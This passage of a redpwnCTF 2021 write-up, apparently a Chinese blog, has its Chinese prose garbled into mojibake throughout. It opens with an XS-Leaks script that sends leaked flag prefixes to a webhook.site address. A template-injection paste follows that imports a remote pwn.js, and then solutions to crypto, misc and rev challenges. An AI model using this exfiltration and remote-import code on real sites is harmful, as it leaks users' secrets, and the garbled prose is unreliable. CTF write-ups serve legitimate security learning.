&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">subwindow&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://pastebin-3.mc.ax/search?query=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">subwindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://pastebin-3.mc.ax/home&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">unset&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰∏∫‰∫ÜÂºïÂÖ•Ëøô‰∏™ËÑöÊú¨ÔºåÊàë‰ª¨Êñ∞Âª∫‰∏Ä‰∏™paste&lt;/p>
&lt;pre tabindex="0">&lt;code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
&lt;/code>&lt;/pre>&lt;p>ÂÖ∂‰ªñÂá†‰∏™ÁâàÊú¨ÁöÑËÑöÊú¨Ôºö&lt;a href="https://gist.github.com/parrot409/6782796ba9be2088a57a679c27f4e037">ver2&lt;/a> &lt;a href="https://gist.github.com/maple3142/10e3d6f03e307016e54e7f9b6073214a">ver3&lt;/a>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a> | &lt;a href="https://owasp.org/www-pdf-archive/Side_Channel_Vulnerabilities.pdf">Side Channel Vulnerabilities on the Web - Detection and Preventio&lt;/a> | &lt;a href="https://dormousehole.readthedocs.io/en/latest/patterns/flashing.html">Flask Ê∂àÊÅØÈó™Áé∞&lt;/a>&lt;/p>
&lt;h2 id="webwtjs">web/wtjs&lt;/h2>
&lt;blockquote>
&lt;p>Ya like golf? How about JS golf?&lt;/p>
&lt;p>&lt;a href="https://wtjs.mc.ax/">wtjs.mc.ax&lt;/a> | &lt;a href="https://admin-bot.mc.ax/wtjs">Admin bot&lt;/a>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/fb14645b75d85a5243bc734b968756485e25c3a1bcb969662a50de2a13982dcf/wtjs.tar">wtjs.tar&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710163120317.png" alt="image-20210710163120317">&lt;/p>
&lt;p>‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶ÊúâÂ≠óÊï∞ÈôêÂà∂ÁöÑfuckjsÔºåÊàë‰∏ç‰ºöÊûÑÈÄ† Â§™ÁóõËã¶‰∫Ü&lt;/p>
&lt;p>wpÂèÇËßÅ&lt;a href="https://docs.google.com/spreadsheets/d/1JGIqgt7aSLYM29ksMPIw2YmIRKEyIvZxXGQJfw7U9Fo/edit#gid=0">‰∏ÄÂº†google sheet&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#wtjs">wp2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200428355.png" alt="image-20210716200428355">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200446450.png" alt="image-20210716200446450">&lt;/p>
&lt;p>‰∏çÂæó‰∏çËØ¥ÔºåËøô‰∏™sheetÁúüÁöÑÊòØÁõ∏ÂΩìÊ∏ÖÊô∞‰∫Ü‚Ä¶‚Ä¶Áî®9Âº†Ë°® ËØ¶ÁªÜÁöÑÂÜô‰∫Ü‰∏Ä‰∏ãÂà∞Â∫ïÊòØÊÄé‰πàÊääÊúÄÁªàÁöÑpayloadÁªôÊãºÂá∫Êù•ÁöÑÔºåÁúüÁöÑÊòØÁé∞‰ª£ÁâàÊ¥ªÂ≠óÂç∞Âà∑ Áªù‰∫Ü Êï∞Â≠óÊ∞ëÂ∑•ÊòØÂêßüòÖ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716203047760.png" alt="image-20210716203047760">&lt;/p>
&lt;p>Â±ûÂÆûÊòØËöåÂü†‰Ωè‰∫ÜüòÖ&lt;/p>
&lt;h2 id="webmdbin">***web/MdBin&lt;/h2>
&lt;blockquote>
&lt;p>Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologies‚Ñ¢, including React, this pastebin has you covered, with brand-new theming support!&lt;/p>
&lt;p>&lt;a href="https://mdbin.mc.ax/">mdbin.mc.ax&lt;/a>&lt;/p>
&lt;p>Submit to the admin at &lt;a href="https://admin-bot.mc.ax/mdbin">admin-bot.mc.ax/mdbin&lt;/a>; the flag is in a cookie.&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/35ee9be7cfa1b5fa6127e412b87ef3b8f6f1f99c676303db4cd18f13605281f5/mdbin.tar.gz">mdbin.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/">wp1&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#mdbin">wp2&lt;/a>&lt;/p>
&lt;p>Áõ¥Êé•ÊîæÂèÇËÄÉÁöÑwpÈìæÊé•ÂêßÔºåËøòÊòØjsÂéüÂûãÊ±°ÊüìÁöÑÈóÆÈ¢òÔºå‰ΩÜÊòØÁî±‰∫éÊàëÂØπjsÂéüÂûãÊ±°ÊüìËøô‰∏™ÈóÆÈ¢ò‰∫ÜËß£ÁöÑ‰∏çÂ§üÊ∑±ÂÖ•Ôºå‰πüÂè™ËÉΩÁÖßÁå´ÁîªËôéÁöÑÂ§çÁé∞ÔºåËøòÊúâÂæàÂ§öËµÑÊñôÈúÄË¶ÅÈ¢ùÂ§ñÁöÑÂéªË°•ÂÖÖÂú∞ÁúãÔºåÂ∞±‰∏çÁè≠Èó®ÂºÑÊñß‰∫ÜÔºå‰∏äÈù¢ÁöÑ‰∏§‰∏™ÈìæÊé•ÈáåÂÜôÁöÑÈÉΩÂæàÂ•ΩÔºÅ&lt;/p>
&lt;h2 id="weblazy-admin">***web/lazy-admin&lt;/h2>
&lt;blockquote>
&lt;p>Looks like another service with no functionality. I hope the admin is doing their job&amp;hellip;&lt;/p>
&lt;p>&lt;a href="https://lazy-admin.mc.ax/">lazy-admin.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/5b2fc5a6d531a90e7f8f31975fcd4bdcd9863a5bb6bcb63df1d4cfd4ad7325b6/lazy-admin.tar.gz">lazy-admin.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#lazy-admin">wp&lt;/a>&lt;/p>
&lt;p>ÈöæÔºåÊàë‰∏çÊáÇ&lt;/p>
&lt;h2 id="miscsanity-check">misc/sanity-check&lt;/h2>
&lt;blockquote>
&lt;p>I get to write the sanity check challenge! Alright!&lt;/p>
&lt;p>&lt;code>flag{1_l0v3_54n17y_ch3ck_ch4ll5}&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;h2 id="miscdiscord">misc/discord&lt;/h2>
&lt;blockquote>
&lt;p>Join the &lt;a href="https://pwn.red/discord">discord&lt;/a>! I hear &lt;code>#rules&lt;/code> is an incredibly engaging read.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124614902.png" alt="image-20210710124614902">&lt;/p>
&lt;h2 id="misccompliant-lattice-feline">misc/compliant-lattice-feline&lt;/h2>
&lt;blockquote>
&lt;p>get a flag! &lt;code>nc mc.ax 31443&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124835520.png" alt="image-20210710124835520">&lt;/p>
&lt;h2 id="miscthe-substitution-game">*misc/the-substitution-game&lt;/h2>
&lt;blockquote>
&lt;p>&lt;code>nc mc.ax 31996&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/e8ab069cf5ede93ff8f0aec7f441b7f5f69500ff049b7c3fc27a5949ecc12d90/chall.py">chall.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>Markov AlgorithmÁΩ¢‰∫Ü&lt;/p>
&lt;p>ÂèÇËßÅÔºö&lt;a href="https://mao.snuke.org/">Markov Algorithm Online&lt;/a>&lt;/p>
&lt;h2 id="miscannabel-lee">misc/annaBEL-lee&lt;/h2>
&lt;blockquote>
&lt;p>sounds from a kingdom by the sea&lt;/p>
&lt;p>The server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.&lt;/p>
&lt;p>What exactly &lt;em>is&lt;/em> the server sending? Sometimes it makes a sound, sometimes it doesn&amp;rsquo;t. Plotting it on a chart might help you see something.&lt;/p>
&lt;p>It might be helpful to turn your sound on, but you&amp;rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enough‚Äîmaybe slow it down to get a better idea.&lt;/p>
&lt;p>This is not audio steganography. Apologies if anyone went down that route.&lt;/p>
&lt;p>&lt;code>nc mc.ax 31845&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>ncËøûÂÖ•ÂêéÊ≤°Êúâ‰ªª‰ΩïÂèØËßÜÁöÑÂõûÊòæÔºå‰ΩÜÊòØËóèÂú®‰∫ÜÂ£∞Èü≥‰ø°ÊÅØÈáå&lt;/p>
&lt;pre tabindex="0">&lt;code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
&lt;/code>&lt;/pre>&lt;p>ÂØºÂá∫ÔºåÊúâ‰∏§ÁßçÂÄºÔºöno bell(\x00) bell(\x07)ÔºåËΩ¨Âåñ‰∏∫0‰∏é1&lt;/p>
&lt;pre tabindex="0">&lt;code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
&lt;/code>&lt;/pre>&lt;p>Êîπ‰∏∫Ëé´ÊñØÁîµÁ†ÅÁöÑÊ†∑Â≠ê&lt;/p>
&lt;pre tabindex="0">&lt;code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
&lt;/code>&lt;/pre>&lt;p>Ëß£ÂØÜ&lt;/p>
&lt;pre tabindex="0">&lt;code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
&lt;/code>&lt;/pre>&lt;p>&lt;code>flag{d1ng-d0n9-g0es-th3-anna-b3l}&lt;/code>&lt;/p>
&lt;h2 id="cryptoscissor">crypto/scissor&lt;/h2>
&lt;blockquote>
&lt;p>I was given this string and told something about scissors. &lt;code>egddagzp_ftue_rxms_iuft_rxms_radymf&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/44dbfcfa8c7590e5afc686ce9d608ddf886c41ef1eee8b86a860af011dc26d73/encrypt.py">encrypt.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710135412576.png" alt="image-20210710135412576">&lt;/p>
&lt;h2 id="cryptobaby">crypto/baby&lt;/h2>
&lt;blockquote>
&lt;p>I want to do an RSA!&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/aaa49d90f7e2f6dda3ed8476879729955fefd68130dbc678e7d872dc2bcd825b/output.txt">output.txt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>n: 228430203128652625114739053365339856393
e: 65537
c: 126721104148692049427127809839057445790
&lt;/code>&lt;/pre>&lt;p>&lt;del>‰∏ÄÁÇπÈÉΩ‰∏ç‰ºöcrypto‚Ä¶‚Ä¶&lt;/del> ÂÖ∂ÂÆûÊü•‰∏Ä‰∏ã&lt;code>RSA n e c&lt;/code>ÂÖ∂ÂÆûÂ∞±ËÉΩÂÅöÂá∫Êù•ÂêéÈù¢ÁöÑ‰∏úË•ø‰∫Ü&lt;/p>
&lt;p>&lt;a href="https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c">RSA decryption using only n e and c&lt;/a> ÁÑ∂ÂêéÂ∞±‰ºöÁü•ÈÅìËøô‰∏™‰∏úË•ø &lt;a href="https://github.com/Ganapati">Ganapati&lt;/a>/&lt;a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool&lt;/a>ÔºåÊàñËÄÖËøô‰∏™Âú®Á∫øÁΩëÁ´ô &lt;a href="https://www.dcode.fr/rsa-cipher">RSA Cipher&lt;/a>&lt;/p>
&lt;p>‰∏∫‰∫ÜdecodeÈ¶ñÂÖàÈúÄË¶ÅÊ†πÊçÆNÊ±ÇÂá∫‰∏§‰∏™‰∫íË¥®ÁöÑpÂíåqÔºåÂèØ‰ª•Áî®Ëøô‰∏™ÁΩëÁ´ôÊù•ÂÅö &lt;a href="https://zh.numberempire.com/numberfactorizer.php">Êï¥Êï∞ÂàÜËß£Â∑•ÂÖ∑&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172732092.png" alt="image-20210716172732092">&lt;/p>
&lt;p>‰πãÂêéÂ∞±ÂèØ‰ª•ÊÑâÂø´ÁöÑËß£ÂØÜ‰∫ÜÔºÅ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172627393.png" alt="image-20210716172627393">&lt;/p>
&lt;h2 id="revwstrings">rev/wstrings&lt;/h2>
&lt;blockquote>
&lt;p>Some strings are wider than normal&amp;hellip;&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/c3c2ce7829ac7fb904ab02de13b4fbdda69232159c7a5dfa6d7d0fa37606a45d/wstrings">wstrings&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808184746679.png" alt="image-20210808184746679">&lt;/p>
&lt;p>&lt;code>flag{n0t_al1_str1ngs_ar3_sk1nny}&lt;/code>&lt;/p>
&lt;h2 id="revbread-making">rev/bread-making&lt;/h2>
&lt;blockquote>
&lt;p>My parents aren&amp;rsquo;t home! Quick, help me make some bread please&amp;hellip; &lt;code>nc mc.ax 31796&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/9eee9f077b941e88e1fe75d404582d4f286d9c74729f3ad0d1bb44a527579af8/bread">bread&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710154321719.png" alt="image-20210710154321719">&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md">wp2&lt;/a> &lt;a href="https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#bread-making">wp3&lt;/a> &lt;a href="https://www.notion.so/bread-making-SOLVED-5cb97be799fc4fee8cd97738a9141713">wp4&lt;/a>&lt;/p>
&lt;p>ÊàëÂΩìÊó∂ÁöÑÊÄùË∑ØÂíåÊÉ≥Ê≥ïÂ§ßËá¥ËøòÊòØÂØπÁöÑÔºå~~ÔºàËôΩÁÑ∂Ê≤°ÊúâÂÅöÂá∫Êù•ÂêßÔºâ~~Ëøô‰∏™Â∞±ÊòØÂÖàÊèêÂèñÂá∫Êñá‰ª∂‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤ÈÉ®ÂàÜÔºåÁÑ∂ÂêéÁî®ÈÄªËæë Âú®‰∫§‰∫íÊ®°Âºè‰∏ãÁî®Ê≠£Á°ÆÁöÑÈ°∫Â∫èËæìÂÖ• ÂÆåÊï¥ÁöÑÈ°∫‰∏ãÊù•Ëøô‰∏™ÊµÅÁ®ãÔºåÊúÄÂêéÊãøÂà∞flagÔºåÊúÄÂêéÁöÑÊ≠£Á°ÆÈ°∫Â∫èÊòØËøôÊ†∑ÁöÑ&lt;/p>
&lt;pre tabindex="0">&lt;code>add ingredients to the bowl
add flour
add yeast
add salt
add water
hide the bowl inside a box
wait 3 hours
work in the basement
preheat the toaster oven
set a timer on your phone
watch the bread bake
pull the tray out with a towel
unplug the fire alarm
open the window
unplug the oven
clean the counters
flush the bread down the toilet
wash the sink
get ready to sleep
close the window
replace the fire alarm
brush teeth and go to bed
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716181440958.png" alt="image-20210716181440958">&lt;/p>
&lt;p>The flag is: &lt;code>flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}&lt;/code>&lt;/p>
&lt;p>Ë∞ÉËØïÁöÑËøáÁ®ãÊòØlinux‰∏ãÁöÑpyËÑöÊú¨&lt;/p>
&lt;pre tabindex="0">&lt;code>from pwn import *
p = remote(&amp;quot;mc.ax&amp;quot;, 31796)
p.sendlineafter(&amp;quot;bowl&amp;quot;, &amp;quot;add flour&amp;quot;)
p.sendlineafter(&amp;quot;flour has been added&amp;quot;, &amp;quot;add yeast&amp;quot;)
p.sendlineafter(&amp;quot;yeast has been added&amp;quot;, &amp;quot;add salt&amp;quot;)
p.sendlineafter(&amp;quot;salt has been added&amp;quot;, &amp;quot;add water&amp;quot;)
p.sendlineafter(&amp;quot;lumpy dough&amp;quot;, &amp;quot;hide the bowl inside a box&amp;quot;)
p.sendlineafter(&amp;quot;to rise&amp;quot;, &amp;quot;wait 3 hours&amp;quot;)
p.sendlineafter(&amp;quot;finish the dough&amp;quot;, &amp;quot;work in the basement&amp;quot;)
p.sendlineafter(&amp;quot;needs to be baked&amp;quot;, &amp;quot;preheat the toaster oven&amp;quot;)
p.sendlineafter(&amp;quot;for 45 minutes&amp;quot;, &amp;quot;set a timer on your phone&amp;quot;)
p.sendlineafter(&amp;quot;awfully long time&amp;quot;, &amp;quot;watch the bread bake&amp;quot;)
p.sendlineafter(&amp;quot;no time to waste&amp;quot;, &amp;quot;pull the tray out with a towel&amp;quot;)
p.sendlineafter(&amp;quot;smoke in the air&amp;quot;, &amp;quot;unplug the fire alarm&amp;quot;)
p.sendlineafter(&amp;quot;in another room&amp;quot;, &amp;quot;open the window&amp;quot;)
p.sendlineafter(&amp;quot;air rushes in&amp;quot;, &amp;quot;unplug the oven&amp;quot;)
p.sendlineafter(&amp;quot;kitchen is a mess&amp;quot;, &amp;quot;wash the sink&amp;quot;)
p.sendlineafter(&amp;quot;sink is cleaned&amp;quot;, &amp;quot;clean the counters&amp;quot;)
p.sendlineafter(&amp;quot;counters are cleaned&amp;quot;, &amp;quot;flush the bread down the toilet&amp;quot;)
p.sendlineafter(&amp;quot;is disposed of&amp;quot;, &amp;quot;get ready to sleep&amp;quot;)
p.sendlineafter(&amp;quot;go to sleep&amp;quot;, &amp;quot;close the window&amp;quot;)
p.sendlineafter(&amp;quot;window is closed&amp;quot;, &amp;quot;replace the fire alarm&amp;quot;)
p.sendlineafter(&amp;quot;alarm is replaced&amp;quot;, &amp;quot;brush teeth and go to bed&amp;quot;)
p.interactive()
p.close()
&lt;/code>&lt;/pre>&lt;p>Ëøô‰∏™ËÑöÊú¨ÁöÑÈÄªËæëÊòØÈÄöËøábreadÊñá‰ª∂ÂØºÂá∫ÁöÑÊñáÊú¨ÔºåÊâæÂá∫ÊúÄÁ¨¶ÂêàÈÄªËæëÁöÑ‰∏ä‰∏ãÊñá ÁÑ∂ÂêéÂà©Áî®sendlineaferÊù•Ëß£È¢òÔºõÂÆûÈôÖÂÅöÈ¢òÁöÑËØù‰∏çÂèØËÉΩÂè™Èù†ÊâìÂ≠óÊù•ËØïËøô‰∏™È°∫Â∫è ‰∏çÊòØËØ¥ËØïËøô‰∏™Êµ™Ë¥πÊó∂Èó¥ ËÄåÊòØÁ≠âÂæÖÁöÑÊó∂Èó¥ÈùûÂ∏∏ÈùûÂ∏∏Áü≠ÊöÇ Ê≤°ÊúâÂÆåÊï¥ÊâìÂÆåÂ≠óÁöÑÊó∂Èó¥&lt;/p>
&lt;h2 id="ÂêéËÆ∞">ÂêéËÆ∞&lt;/h2>
&lt;p>ËøôÊ¨°ÁöÑredpwnÊúâ47ÈÅìÈ¢òÔºåÂêÑ‰∏™ÊñπÂêëÈÉΩÊúâÈÄÇÂêàÊàëËøôÁßçÁ≠æÂà∞ÈÄâÊâãÁöÑÁÆÄÂçïÈ¢òÔºåÂ•ΩËØÑ~&lt;/p>
